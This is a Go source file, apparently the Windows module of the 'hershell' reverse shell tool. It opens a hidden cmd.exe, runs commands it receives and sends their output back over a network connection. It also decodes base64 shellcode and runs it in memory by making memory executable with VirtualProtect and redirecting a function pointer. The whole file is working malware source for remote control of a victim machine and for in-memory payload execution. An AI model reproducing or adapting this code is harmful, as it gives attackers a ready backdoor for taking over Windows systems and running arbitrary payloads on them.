// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"hershell/shell"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go shell.ExecShellcode(shellcode)
		}
	}
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func ExecShellcode(shellcode []byte) {
	f := func() {}
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	f()
}
